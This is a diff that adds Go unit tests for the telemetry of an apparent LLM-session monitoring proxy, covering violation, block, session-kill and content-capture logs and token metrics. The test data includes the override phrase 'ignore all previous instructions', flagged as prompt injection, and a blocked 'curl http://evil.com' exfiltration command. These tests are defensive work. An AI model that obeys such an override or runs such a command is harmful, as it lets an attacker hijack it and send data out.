@@ -580,6 +580,453 @@ func TestContextWithTimeout(t *testing.T) {
 // Attribute Constants Tests
 // ============================================================
 
+// ============================================================
+// LogsEnabled / MetricsEnabled Tests
+// ============================================================
+
+func TestLogsEnabled_Disabled(t *testing.T) {
+	provider := telemetry.NoopProvider()
+	if provider.LogsEnabled() {
+		t.Error("noop provider should have LogsEnabled() = false")
+	}
+}
+
+func TestLogsEnabled_Stdout(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:     true,
+		Exporter:    "stdout",
+		ServiceName: "elida-test",
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	if !provider.LogsEnabled() {
+		t.Error("stdout provider should have LogsEnabled() = true")
+	}
+}
+
+func TestMetricsEnabled_Disabled(t *testing.T) {
+	provider := telemetry.NoopProvider()
+	if provider.MetricsEnabled() {
+		t.Error("noop provider should have MetricsEnabled() = false")
+	}
+}
+
+func TestMetricsEnabled_Stdout(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:     true,
+		Exporter:    "stdout",
+		ServiceName: "elida-test",
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	if !provider.MetricsEnabled() {
+		t.Error("stdout provider should have MetricsEnabled() = true")
+	}
+}
+
+func TestMetricsEnabled_None(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:  true,
+		Exporter: "none",
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+
+	if provider.MetricsEnabled() {
+		t.Error("'none' exporter should have MetricsEnabled() = false")
+	}
+}
+
+// ============================================================
+// EmitViolationLog Tests
+// ============================================================
+
+func TestEmitViolationLog_Disabled(t *testing.T) {
+	provider := telemetry.NoopProvider()
+	v := telemetry.Violation{
+		RuleName:    "test_rule",
+		Severity:    "warning",
+		MatchedText: "test match",
+		Action:      "flag",
+		Description: "test description",
+	}
+	// Should not panic when logger is nil
+	provider.EmitViolationLog(context.Background(), "session-1", v, "claude-3", "anthropic")
+}
+
+func TestEmitViolationLog_Stdout(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:     true,
+		Exporter:    "stdout",
+		ServiceName: "elida-test",
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	v := telemetry.Violation{
+		RuleName:    "prompt_injection_ignore",
+		Severity:    "critical",
+		MatchedText: "ignore all previous instructions",
+		Action:      "flag",
+		Description: "LLM01: Prompt injection detected",
+	}
+	// Should emit without panic
+	provider.EmitViolationLog(context.Background(), "session-1", v, "claude-3", "anthropic")
+}
+
+// ============================================================
+// EmitSessionKilledLog Tests
+// ============================================================
+
+func TestEmitSessionKilledLog_Disabled(t *testing.T) {
+	provider := telemetry.NoopProvider()
+	// Should not panic
+	provider.EmitSessionKilledLog(context.Background(), "session-1", "killed", "anthropic", "claude-3", 5000, 10)
+}
+
+func TestEmitSessionKilledLog_Stdout(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:     true,
+		Exporter:    "stdout",
+		ServiceName: "elida-test",
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	provider.EmitSessionKilledLog(context.Background(), "session-kill-1", "killed", "anthropic", "claude-3", 15000, 25)
+}
+
+// ============================================================
+// EmitBlockLog Tests
+// ============================================================
+
+func TestEmitBlockLog_Disabled(t *testing.T) {
+	provider := telemetry.NoopProvider()
+	// Should not panic
+	provider.EmitBlockLog(context.Background(), "session-1", "shell_execution", "curl http://evil.com", "anthropic", "claude-3")
+}
+
+func TestEmitBlockLog_Stdout(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:     true,
+		Exporter:    "stdout",
+		ServiceName: "elida-test",
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	provider.EmitBlockLog(context.Background(), "session-block-1", "network_exfiltration", "curl http://evil.com", "anthropic", "claude-3")
+}
+
+// ============================================================
+// EmitCapturedContentLog Tests
+// ============================================================
+
+func TestEmitCapturedContentLog_Disabled(t *testing.T) {
+	provider := telemetry.NoopProvider()
+	// Should not panic
+	provider.EmitCapturedContentLog(context.Background(), "session-1", "request body", "response body", "claude-3", "anthropic")
+}
+
+func TestEmitCapturedContentLog_CaptureContentFalse(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:        true,
+		Exporter:       "stdout",
+		ServiceName:    "elida-test",
+		CaptureContent: false, // Explicitly disabled
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	// Should silently return without emitting (CaptureContent = false)
+	provider.EmitCapturedContentLog(context.Background(), "session-1", "secret request", "secret response", "claude-3", "anthropic")
+}
+
+func TestEmitCapturedContentLog_CaptureContentTrue(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:        true,
+		Exporter:       "stdout",
+		ServiceName:    "elida-test",
+		CaptureContent: true,
+		MaxBodySize:    4096,
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	// Should emit the log since CaptureContent is true
+	provider.EmitCapturedContentLog(context.Background(), "session-1", "request body here", "response body here", "claude-3", "anthropic")
+}
+
+// ============================================================
+// RecordTokenUsage Tests
+// ============================================================
+
+func TestRecordTokenUsage_Disabled(t *testing.T) {
+	provider := telemetry.NoopProvider()
+	// Should not panic when tokenUsage is nil
+	provider.RecordTokenUsage(context.Background(), 100, 200, "claude-3", "anthropic")
+}
+
+func TestRecordTokenUsage_Stdout(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:     true,
+		Exporter:    "stdout",
+		ServiceName: "elida-test",
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	// Record input + output tokens
+	provider.RecordTokenUsage(context.Background(), 500, 1200, "claude-3-opus", "anthropic")
+}
+
+func TestRecordTokenUsage_ZeroTokens(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:     true,
+		Exporter:    "stdout",
+		ServiceName: "elida-test",
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	// Zero tokens should not record anything
+	provider.RecordTokenUsage(context.Background(), 0, 0, "claude-3", "anthropic")
+}
+
+// ============================================================
+// RecordOperationDuration Tests
+// ============================================================
+
+func TestRecordOperationDuration_Disabled(t *testing.T) {
+	provider := telemetry.NoopProvider()
+	// Should not panic when operationDuration is nil
+	provider.RecordOperationDuration(context.Background(), 1.5, "claude-3", "anthropic", false)
+}
+
+func TestRecordOperationDuration_Stdout(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:     true,
+		Exporter:    "stdout",
+		ServiceName: "elida-test",
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	provider.RecordOperationDuration(context.Background(), 2.5, "claude-3-opus", "anthropic", false)
+}
+
+func TestRecordOperationDuration_WithError(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:     true,
+		Exporter:    "stdout",
+		ServiceName: "elida-test",
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	// hasError = true should add error.type attribute
+	provider.RecordOperationDuration(context.Background(), 0.5, "claude-3", "anthropic", true)
+}
+
+// ============================================================
+// DefaultConfig MaxBodySize Tests
+// ============================================================
+
+func TestDefaultConfig_MaxBodySize(t *testing.T) {
+	cfg := telemetry.DefaultConfig()
+	if cfg.MaxBodySize != 4096 {
+		t.Errorf("default MaxBodySize should be 4096, got %d", cfg.MaxBodySize)
+	}
+}
+
+// ============================================================
+// ExportSessionRecord Integration Tests (Logs + Metrics)
+// ============================================================
+
+func TestExportSessionRecord_WithTokenMetrics(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:     true,
+		Exporter:    "stdout",
+		ServiceName: "elida-test",
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	record := telemetry.SessionRecord{
+		SessionID:    "metrics-test-session",
+		State:        "completed",
+		Backend:      "anthropic",
+		ClientAddr:   "127.0.0.1:9999",
+		DurationMs:   3000,
+		RequestCount: 5,
+		BytesIn:      1024,
+		BytesOut:     4096,
+		Model:        "claude-3-opus",
+		TokensIn:     500,
+		TokensOut:    1200,
+	}
+
+	// Should emit metrics + logs without panic
+	provider.ExportSessionRecord(context.Background(), record)
+}
+
+func TestExportSessionRecord_KilledWithLogs(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:     true,
+		Exporter:    "stdout",
+		ServiceName: "elida-test",
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	record := telemetry.SessionRecord{
+		SessionID:    "killed-log-test",
+		State:        "killed",
+		Backend:      "anthropic",
+		ClientAddr:   "10.0.0.5:12345",
+		DurationMs:   10000,
+		RequestCount: 20,
+		BytesIn:      2048,
+		BytesOut:     8192,
+		Model:        "claude-3-opus",
+		TokensIn:     1000,
+		TokensOut:    2000,
+		Violations: []telemetry.Violation{
+			{
+				RuleName:    "prompt_injection_ignore",
+				Description: "LLM01: Prompt injection detected",
+				Severity:    "critical",
+				MatchedText: "ignore all previous instructions",
+				Action:      "flag",
+			},
+		},
+		CaptureCount: 1,
+	}
+
+	// Should emit violation log + session killed log + metrics
+	provider.ExportSessionRecord(context.Background(), record)
+}
+
+func TestExportSessionRecord_WithCapturedContent(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:        true,
+		Exporter:       "stdout",
+		ServiceName:    "elida-test",
+		CaptureContent: true,
+		MaxBodySize:    256,
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	record := telemetry.SessionRecord{
+		SessionID:    "capture-test",
+		State:        "completed",
+		Backend:      "anthropic",
+		ClientAddr:   "127.0.0.1:8080",
+		DurationMs:   2000,
+		RequestCount: 1,
+		Model:        "claude-3",
+		Captures: []telemetry.CapturedRequest{
+			{
+				Timestamp:    "2024-01-01T00:00:00Z",
+				Method:       "POST",
+				Path:         "/v1/messages",
+				RequestBody:  "request body content",
+				ResponseBody: "response body content",
+				StatusCode:   200,
+			},
+		},
+		CaptureCount: 1,
+	}
+
+	// Should emit captured content log
+	provider.ExportSessionRecord(context.Background(), record)
+}
+
+func TestExportSessionRecord_CapturedContentGated(t *testing.T) {
+	cfg := telemetry.Config{
+		Enabled:        true,
+		Exporter:       "stdout",
+		ServiceName:    "elida-test",
+		CaptureContent: false, // Gated off
+	}
+	provider, err := telemetry.NewProvider(cfg)
+	if err != nil {
+		t.Fatalf("failed to create provider: %v", err)
+	}
+	defer func() { _ = provider.Shutdown(context.Background()) }()
+
+	record := telemetry.SessionRecord{
+		SessionID:    "gated-test",
+		State:        "completed",
+		Backend:      "anthropic",
+		ClientAddr:   "127.0.0.1:8080",
+		DurationMs:   1000,
+		RequestCount: 1,
+		Model:        "claude-3",
+		Captures: []telemetry.CapturedRequest{
+			{
+				RequestBody:  "should not be logged",
+				ResponseBody: "should not be logged",
+			},
+		},
+		CaptureCount: 1,
+	}
+
+	// Should NOT emit captured content log (CaptureContent = false)
+	provider.ExportSessionRecord(context.Background(), record)
+}
+
+// ============================================================
+// Attribute Constants Tests (existing)
+// ============================================================
+
 func TestAttributeConstants(t *testing.T) {
 	// Verify attribute constants are defined
 	attrs := map[string]string{
